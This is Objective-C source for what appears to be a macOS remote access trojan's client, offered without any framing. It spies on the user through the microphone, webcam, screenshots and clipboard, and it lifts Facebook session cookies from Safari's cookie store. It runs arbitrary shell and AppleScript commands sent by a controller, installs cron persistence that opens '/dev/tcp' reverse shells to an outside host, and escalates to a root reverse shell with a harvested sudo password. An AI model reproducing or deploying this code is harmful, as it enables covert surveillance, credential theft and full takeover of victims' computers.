
#import "espl.h"

@implementation espl

@synthesize soundRecorder, fileManager;

BOOL micinuse;
BOOL systaskrunning = false;
BOOL PROMPTOPEN = false;
bool debug;
NSString *password;
FILE *cookieJar;
char lastBytes[64];

-(id)init {
    fileManager = [[NSFileManager alloc] init];
    return self;
}

//MARK: Convenience
-(void)blank {
    [self sendString:@""]; //bang
}

char* parseBinary(int* searchChars,int sizeOfSearch) {
    NSString *cookieJarPath = [NSString stringWithFormat:@"%@/Library/Cookies/Cookies.binarycookies",NSHomeDirectory()];
    cookieJar = fopen([cookieJarPath UTF8String], "rb+");
    fseek(cookieJar, 0L, SEEK_END);
    long cookieJarSize = ftell(cookieJar);
    int pos = 0; int curSearch = 0;int curChar;
    fseek(cookieJar, 0, 0);
    
    while(pos <= cookieJarSize) {
        curChar = getc(cookieJar);pos++;
        
        if(curChar == searchChars[curSearch]) { /* found a match */
            curSearch++;                        /* search for next char */
            if(curSearch > sizeOfSearch - 1) {                 /* found the whole string! */
                curSearch = 0;                  /* start searching again */
                fread(lastBytes,1,64,cookieJar); /* read 5 bytes */
                return lastBytes;
            }
            
        } else { /* didn't find a match */
            if (curSearch > 18) {
                printf("fuck %d\n",searchChars[curSearch]);
            }
            curSearch = 0;                     /* go back to searching for first char */
        }
    };
    return "null";
}
    
-(void)debugLog:(NSString *)string {
    system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",string] UTF8String]);
}

//MARK: Socketry

int sockfd;

-(int)connect:(NSString*)host
             :(long)port {
    socklen_t len;
    struct sockaddr_in address;
    int result;
    
    /*  Create a socket for the client.  */
    sockfd = socket (AF_INET, SOCK_STREAM, 0);
    /*  Name the socket, as agreed with the server.  */
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr ([host UTF8String]);
    address.sin_port = htons (port);
    len = sizeof (address);
    result = connect (sockfd, (struct sockaddr *) &address, len);
    return result;
}



-(void)sendString:(NSString *)string {
    string = [string stringByReplacingOccurrencesOfString:@"’" withString:@"'"];
    NSString *finalstr = [NSString stringWithFormat:@"%@%@",[escryptor encryptNSStringToB64:self.skey :string],_terminator];
    write (sockfd, [finalstr UTF8String], finalstr.length);
}

-(void)liveSendString:(NSString *)string {
    NSMutableString *reversed = [NSMutableString string];
    NSInteger charIndex = [_terminator length];
    while (charIndex > 0) {
        charIndex--;
        NSRange subRange = NSMakeRange(charIndex, 1);
        [reversed appendString:[_terminator substringWithRange:subRange]];
    }

    NSString *finalstr = [NSString stringWithFormat:@"%@%@",
                          [escryptor encryptNSStringToB64:self.skey :string],reversed];
    write (sockfd, [finalstr UTF8String], finalstr.length);
}


-(void)receiveFileData:(NSString *)saveToPath :(long)fileSize {
    [self blank];
    long bsize = 1024;
    char buffer[bsize];
    NSMutableData *data = [NSMutableData alloc];
    //we use both chunks to make sure we never check an incomplete terminator string
    NSString *lastchunk = @"";
    NSString *thischunk = @"";
    while(read (sockfd, &buffer, sizeof(buffer))) {
        //append data
        thischunk = [NSString stringWithFormat:@"%s",buffer];
        [data appendBytes:buffer length:sizeof(buffer)];
        //detect terminator, decrypt data, write to file
        if (!([[NSString stringWithFormat:@"%@%@",lastchunk,thischunk] rangeOfString:_terminator].location == NSNotFound)) {
            //base64 decode file data
            data = [[NSMutableData alloc] initWithBase64EncodedData:
                                   [data subdataWithRange:NSMakeRange(0, fileSize)] options:0];
            //decrypt nsdata and write to file
            [[escryptor decryptNSData:_skey :data] writeToFile:saveToPath atomically:true];
            break;
        }
        lastchunk = [NSString stringWithFormat:@"%s",buffer];
        memset(buffer,'\0',sizeof(buffer));
    }
    [self blank];
}

-(void)sendFileData:(NSData*)fileData {
    NSData *encryptedData = [escryptor encryptNSData:self.skey :fileData];
    [self sendString:[NSString stringWithFormat:@"%lu",encryptedData.length]];
    write (sockfd, [encryptedData bytes], encryptedData.length);
    write (sockfd, [_terminator UTF8String], _terminator.length);
}

//MARK: Mic

-(void)mic:(NSString *)arg {
    NSString *usage = @"Usage: mic [record|stop]";
    if ([arg isEqualToString:@""]) {
        [self sendString:usage];
    }
    else if ([arg isEqualToString:@"record"]) {
        if ([self recordAudio]) {
            [self sendString:@"Listening..."];
        }
        else {
            [self sendString:@"Already Recording"];
        }
    }
    else if ([arg isEqualToString:@"stop"]) {
        if ([self stopAudio]) {
            [self sendString:@"1"];
        }
        else {
            [self sendString:@"Not currently recording"];
        }
    }
    else {
        [self sendString:usage];
    }
}

-(void)initmic {
    NSString *tempDir;
    NSURL *soundFile;
    NSDictionary *soundSetting;
    tempDir = @"/tmp/";
    soundFile = [NSURL fileURLWithPath: [tempDir stringByAppendingString:@".avatmp"]];
    soundSetting = [NSDictionary dictionaryWithObjectsAndKeys:
                    [NSNumber numberWithFloat: 44100.0],AVSampleRateKey,
                    [NSNumber numberWithInt: kAudioFormatMPEG4AAC],AVFormatIDKey,
                    [NSNumber numberWithInt: 2],AVNumberOfChannelsKey,
                    [NSNumber numberWithInt: AVAudioQualityHigh],AVEncoderAudioQualityKey, nil];
    soundRecorder = [[AVAudioRecorder alloc] initWithURL: soundFile settings: soundSetting error: nil];
}

-(BOOL)stopAudio {
    if (micinuse) {
        [soundRecorder stop];
        micinuse = false;
        return true;
    }
    else {
        return false;
    }
    
}

-(BOOL)recordAudio {
    if (!micinuse) {
        [self initmic];
        [soundRecorder record];
        micinuse = true;
        return true;
    }
    else {
        return false;
    }
}

//MARK: Camera

-(NSData*)takePicture {
    [self debugLog:@"taking picture"];
    __block BOOL done = NO;
    __block NSData *pictureData = nil;
    [self captureWithBlock:^(NSData *imageData)
     {
         done = YES;
         if (imageData == nil) {
             [self sendString:@"-3"];
         }
         else {
             pictureData = imageData;
         }
     }];
    while (!done) {
        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.05]];
    }
    [self stopcapture];
    return pictureData;
}

- (AVCaptureDevice *)getcapturedevice
{
    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;
    for (AVCaptureDevice *device in videoDevices){
        if (device.position == AVCaptureDevicePositionUnspecified){
            captureDevice = device;
            break;
        }
    }
    return captureDevice;
}

-(void)initcamera {
    self.session = [[AVCaptureSession alloc] init];
    self.session.sessionPreset = AVCaptureSessionPresetiFrame1280x720;
    AVCaptureDevice *device = nil;
    NSError *error = nil;
    device = [self getcapturedevice];
    
    //camera
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];
    if (!input) {
        // Handle the error appropriately.
        NSLog(@"ERROR: trying to open camera: %@", error);
    }
    [self.session addInput:input];
    self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
    NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
    [self.stillImageOutput setOutputSettings:outputSettings];
    [self.session addOutput:self.stillImageOutput];
    [self.session startRunning];
    [NSThread sleepForTimeInterval:1];
}

-(void)captureWithBlock:(void (^)(NSData *))block {
    //initialize camera
    [self initcamera];
    
    //capture picture
    AVCaptureConnection* videoConnection = nil;
    for (AVCaptureConnection* connection in self.stillImageOutput.connections)
    {
        for (AVCaptureInputPort* port in [connection inputPorts])
        {
            if ([[port mediaType] isEqual:AVMediaTypeVideo])
            {
                videoConnection = connection;
                break;
            }
        }
        if (videoConnection)
            break;
    }
    
    //capture still image from video connection
    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
     {
         if (error) {
             printf("there was an error with imagesamplebuffer!\n");
         }
         NSData* imageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
         
         if (imageData) {
             block(imageData);
         }
         else {
             block(nil);
         }
     }];
}

-(void)stopcapture {
    [self.session stopRunning];
}

//MARK: File Management
//lets just use system ls for now
/*
-(void)directoryList:(NSString *)arg {
    //basically "ls"
    NSArray *files;
    NSString *dir = [fileManager currentDirectoryPath];
    if (![arg isEqualToString:@""]) {
        dir = arg;
    }
    
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
        if (!isdir) {
            [self sendString:[NSString stringWithFormat:@"%@: is a directory",dir]];
            return;
        }
        else { //IF EVERYTHING IS OK, LS!
            NSError *error;
            files = [fileManager contentsOfDirectoryAtPath:dir error:&error];
            if (error) { //if something goes wrong
                [self sendString:[NSString stringWithFormat:@"%@",error]];
                return;
            }
            
            //info of directories
            NSString *result = @"";
            for (NSString *fName in files) {
                NSDictionary *fAttr = [fileManager attributesOfItemAtPath:[NSString stringWithFormat:@"%@/%@",dir,fName] error:&error];
                
                //TODO: make this a function
                NSString *fSize = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFileSize]];
                NSString *space1 = @"  ";
                int space1len = 10;
                for (unsigned int i = 0; i < space1len - [fSize length] && [fSize length] < space1len; i = i + 1) {
                    space1 = [NSString stringWithFormat:@"%@ ",space1];
                }
                
                NSString *fPerm = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFilePosixPermissions]];
                NSString *space2 = @"  ";
                int space2len = 4;
                for (unsigned int i = 0; i < space2len - [fPerm length] && [fPerm length] < space2len; i = i + 1) {
                    space2 = [NSString stringWithFormat:@"%@ ",space2];
                }
                
                NSString *fModDate = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFileModificationDate]];
                NSString *space3 = @"  ";
                int space3len = 20;
                for (unsigned int i = 0; i < space3len - [fModDate length] && [fModDate length] < space3len; i = i + 1) {
                    space3 = [NSString stringWithFormat:@"%@ ",space3];
                }
                
                NSString *fOwner = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFileOwnerAccountName]];
                NSString *space4 = @"  ";
                int space4len = 12;
                for (unsigned int i = 0; i < space4len - [fOwner length] && [fOwner length] < space4len; i = i + 1) {
                    space4 = [NSString stringWithFormat:@"%@ ",space4];
                }
                
                result = [result stringByAppendingString:[NSString stringWithFormat:@"%@%@%@%@%@%@%@%@%@\n",
                                                          fSize,
                                                          space1,
                                                          fPerm,
                                                          space2,
                                                          fModDate,
                                                          space3,
                                                          fOwner,
                                                          space4,
                                                          fName]];
            }
            if ([result length] > 0) {
                result = [result stringByReplacingOccurrencesOfString:@" +0000" withString:@""];
                result = [NSString stringWithFormat:@"total %lu\n%@",[files count],result];
                result = [result substringToIndex:[result length] - 1];
            }
            
            [self sendString:result];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]];
        return;
    }
}

//use system rm instead
-(void)rmFile:(NSString *)arg {
    if ([arg isEqualToString:@""]) {
        [self sendString:@"Usage: rm filename"];
        return;
    }
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:arg isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@: is a directory",arg]];
        }
        else {
            [fileManager removeItemAtPath:arg error:NULL];
            [self sendString:@""];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",arg]];
    }
}
*/

-(void)changeWD:(NSString *)arg {
    //basically "cd"
    NSString *dir = NSHomeDirectory();
    if (![arg isEqualToString:@""]) {
        dir = arg;
    }
    
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
        if (isdir) {
            [fileManager changeCurrentDirectoryPath:dir];
            [self blank];
        }
        else {
            [self sendString:[NSString stringWithFormat:@"%@: Not a directory",dir]];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]];
    }
}

-(NSData*)filePathToData:(NSString *)arg {
    BOOL isdir;
    if ([fileManager fileExistsAtPath:arg isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@ is a directory",arg]];
        }
        else {
            return [fileManager contentsAtPath:arg];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@ not found",arg]];
    }
    return nil;
}

-(void)idleTime {
    //returns number of seconds
    int64_t idlesecs = -1;
    io_iterator_t iter = 0;
    if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) {
        io_registry_entry_t entry = IOIteratorNext(iter);
        if (entry) {
            CFMutableDictionaryRef dict = NULL;
            if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) {
                CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
                if (obj) {
                    int64_t nanoseconds = 0;
                    if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) {
                        idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
                    }
                }
                CFRelease(dict);
            }
            IOObjectRelease(entry);
        }
        IOObjectRelease(iter);
    }
   [self sendString:[NSString stringWithFormat:@"%lld",idlesecs]];
}

-(void)getPid {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [self sendString:[NSString stringWithFormat:@"%d",processID]];
}

-(void)getFacebook {
    NSString *result = @"";
    int fb_cuser[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6f, 0x6f, 0x6b,
        0x2e, 0x63, 0x6f, 0x6d, 0x00, 0x63, 0x5f, 0x75,
        0x73, 0x65, 0x72, 0x00, 0x2f, 0x00}; //facebook.com c_user /
    result = [NSString stringWithFormat:@"c_user = %s\n",parseBinary(fb_cuser,22)];

    int fb_xs[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6F, 0x6F, 0x6B,
        0x2E, 0x63, 0x6F, 0x6D, 0x00, 0x78, 0x73, 0x00,
        0x2f, 0x00}; //facebook.com xs /
    result = [NSString stringWithFormat:@"%@xs = %s\n\n",result,parseBinary(fb_xs,18)];

    [self sendString:result];
}

-(void)getPaste {
    //easy :p
    NSPasteboard *myPasteboard  = [NSPasteboard generalPasteboard];
    NSString *contents = [myPasteboard  stringForType:NSPasteboardTypeString];
    if (contents == nil) {
        [self sendString:@"empty"];
    }
    [self sendString:contents];
}

-(void)set_brightness:(NSString *)arg {
    if ([arg isEqualToString:@""]) {
        [self sendString:@"Usage: brightness 0.x"];
        return;
    }
    const int kMaxDisplays = 16;
    const CFStringRef kDisplayBrightness = CFSTR(kIODisplayBrightnessKey);
    
    CGDirectDisplayID display[kMaxDisplays];
    CGDisplayCount numDisplays;
    CGDisplayErr err;
    err = CGGetActiveDisplayList(kMaxDisplays, display, &numDisplays);
    
    if (err != CGDisplayNoErr) {
        [self blank];
        return;
    }
    
    for (CGDisplayCount i = 0; i < numDisplays; ++i) {
        CGDirectDisplayID dspy = display[i];
        CFDictionaryRef originalMode = CGDisplayCurrentMode(dspy);
        io_service_t service = CGDisplayIOServicePort(dspy);
        
        float brightness;
        err= IODisplayGetFloatParameter(service,
                                        kNilOptions, kDisplayBrightness,
                                        &brightness);
        IODisplaySetFloatParameter(service, kNilOptions, kDisplayBrightness, [arg floatValue]);
    }
    [self blank];

}

-(NSData *)screenshot {
    CGImageRef screenShot = CGWindowListCreateImage(CGRectInfinite, kCGWindowListOptionOnScreenOnly, kCGNormalWindowLevel, kCGWindowImageDefault);
    NSBitmapImageRep *bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:screenShot];
    // Create an NSImage and add the bitmap rep to it...
    NSImage *image = [[NSImage alloc] init];
    [image addRepresentation:bitmapRep];
    NSData *imageData = [image TIFFRepresentation];
    //convert to jpeg
    NSBitmapImageRep *imageRep = [NSBitmapImageRep imageRepWithData:imageData];
    NSNumber *compressionFactor = [NSNumber numberWithFloat:0.9];
    NSDictionary *imageProps = [NSDictionary dictionaryWithObject:compressionFactor forKey:NSImageCompressionFactor];
    imageData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
    return imageData;
}

-(void)removePersistence:(NSString *)ip :(int)port {
    NSString *persist = [NSString stringWithFormat:@"* * * * * bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null\n",ip,port];
    system("crontab -l > /private/tmp/.cryon");
    NSData *crondata = [fileManager contentsAtPath:@"/private/tmp/.cryon"];
    NSString *newcron = [[NSString alloc]initWithData:crondata encoding:NSUTF8StringEncoding];
    newcron = [newcron stringByReplacingOccurrencesOfString:persist withString:@""];
    [newcron writeToFile:@"/private/tmp/.cryon" atomically:true encoding:NSUTF8StringEncoding error:nil];
    system("crontab /private/tmp/.cryon; rm /private/tmp/.cryon");
    [self sendString:@""];
}

-(void)persistence:(NSString *)ip :(int)port {
    [self removePersistence:ip:port];
    NSString *payload = [NSString stringWithFormat:@"crontab -l > /private/tmp/.cryon; echo '* * * * * bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null' >> /private/tmp/.cryon;crontab /private/tmp/.cryon; rm /private/tmp/.cryon",ip,port];
    system([payload UTF8String]);
    [self sendString:@""];
}

-(void)openURL:(NSString *)arg {
    if ([arg isEqualToString:@""]) {
        [self sendString:@"Usage: openurl http://example.com"];
        return;
    }
    NSURL *url = [NSURL URLWithString:arg];
    [[NSWorkspace sharedWorkspace] openURL:url];
    [self blank];
}

-(void)runtask:(NSString *)cmd {
    if ([cmd  isEqual: @"endtask"] && systaskrunning) {
        [_systask terminate];
        return;
    }
    //http://stackoverflow.com/questions/23937690/getting-process-output-using-nstask-on-the-go
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        systaskrunning = true;
        _systask = [[NSTask alloc] init];
        [_systask setLaunchPath:@"/bin/bash"];
        [_systask setArguments:@[ @"-c", cmd]];
        [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
        
        NSPipe *stdoutPipe = [NSPipe pipe];
        [_systask setStandardOutput:stdoutPipe];
        [_systask setStandardError:stdoutPipe];
        
        NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
        [stdoutHandle waitForDataInBackgroundAndNotify];
        id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
                                                                        object:stdoutHandle queue:nil
                                                                    usingBlock:^(NSNotification *note)
                       {
                           NSData *dataRead = [stdoutHandle availableData];
                           NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
                           [self liveSendString:newOutput];
                           [stdoutHandle waitForDataInBackgroundAndNotify];
                       }];
        [_systask launch];
        [_systask waitUntilExit];
        [[NSNotificationCenter defaultCenter] removeObserver:observer];
        systaskrunning = false;
        [self blank];
    });
}

-(void)runAppleScript:(NSString *)cmd :(NSString *)args {
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        NSAppleScript *aps = [[NSAppleScript alloc] initWithSource:args];
        NSDictionary *error = nil;
        NSAppleEventDescriptor *asDescriptor = [aps executeAndReturnError:&error];
        if (error == NULL) {
            if ([[asDescriptor stringValue] length] < 1) {
                [self debugLog:@"result is blank"];
                [self blank];
            }
            else {
                if ([cmd isEqualToString:@"prompt"]) {
                    password = [asDescriptor stringValue];
                }
                [self sendString:[NSString stringWithFormat:@"%@",[asDescriptor stringValue]]];
            }
        }
        else {
            [self sendString:[NSString stringWithFormat:@"%@",error]];
        }
    });
}


-(void)su:(NSString *)pass :(NSString *)ip :(int)port {
    __block NSString *result = @"";
    systaskrunning = true;
    _systask = [[NSTask alloc] init];
    [_systask setLaunchPath:@"/bin/bash"];
    [_systask setArguments:@[ @"-c", [NSString stringWithFormat:@"echo '%@' | sudo -S whoami",pass]]];
    [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
    
    NSPipe *stdoutPipe = [NSPipe pipe];
    [_systask setStandardOutput:stdoutPipe];
    [_systask setStandardError:stdoutPipe];
    
    NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
    [stdoutHandle waitForDataInBackgroundAndNotify];
    id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
                                                                    object:stdoutHandle queue:nil
                                                                usingBlock:^(NSNotification *note)
                   {
                       NSData *dataRead = [stdoutHandle availableData];
                       NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
                       result = [NSString stringWithFormat:@"%@%@",result,newOutput];

                       [stdoutHandle waitForDataInBackgroundAndNotify];
                   }];
    [_systask launch];
    [_systask waitUntilExit];
    [[NSNotificationCenter defaultCenter] removeObserver:observer];
    systaskrunning = false;
    [self debugLog:pass];
    [self sendString:result];
    if (!([result rangeOfString:@"root"].location == NSNotFound)) {
        sleep(1);
        system([[NSString stringWithFormat:@"echo '%@' | sudo -S bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null",pass,ip,port] UTF8String]);
        exit(0);
    }
}

-(NSData *)GetMACAddress {
    kern_return_t           kr          = KERN_SUCCESS;
    CFMutableDictionaryRef  matching    = NULL;
    io_iterator_t           iterator    = IO_OBJECT_NULL;
    io_object_t             service     = IO_OBJECT_NULL;
    CFDataRef               result      = NULL;
    
    matching = IOBSDNameMatching( kIOMasterPortDefault, 0, "en0" );
    if ( matching == NULL )
    {
        fprintf( stderr, "IOBSDNameMatching() returned empty dictionary\n" );
        return ( NULL );
    }
    
    kr = IOServiceGetMatchingServices( kIOMasterPortDefault, matching, &iterator );
    if ( kr != KERN_SUCCESS )
    {
        fprintf( stderr, "IOServiceGetMatchingServices() returned %d\n", kr );
        return ( NULL );
    }
    
    while ( (service = IOIteratorNext(iterator)) != IO_OBJECT_NULL )
    {
        io_object_t parent = IO_OBJECT_NULL;
        
        kr = IORegistryEntryGetParentEntry( service, kIOServicePlane, &parent );
        if ( kr == KERN_SUCCESS )
        {
            if ( result != NULL )
                CFRelease( result );
            
            result = IORegistryEntryCreateCFProperty( parent, CFSTR("IOMACAddress"), kCFAllocatorDefault, 0 );
            IOObjectRelease( parent );
        }
        else
        {
            fprintf( stderr, "IORegistryGetParentEntry returned %d\n", kr );
        }
        
        IOObjectRelease( service );
    }
    return (__bridge NSData *)(result);
}

-(NSString *)GetMACAddressDisplayString {
    NSData * macData = [self GetMACAddress];
    if ( [macData length] == 0 )
        return ( nil );
    
    const UInt8 *bytes = [macData bytes];
    
    NSMutableString * result = [NSMutableString string];
    for ( NSUInteger i = 0; i < [macData length]; i++ )
    {
        if ( [result length] != 0 )
            [result appendFormat: @":%02hhx", bytes[i]];
        else
            [result appendFormat: @"%02hhx", bytes[i]];
    }
    return ( [result copy] );
}

@end






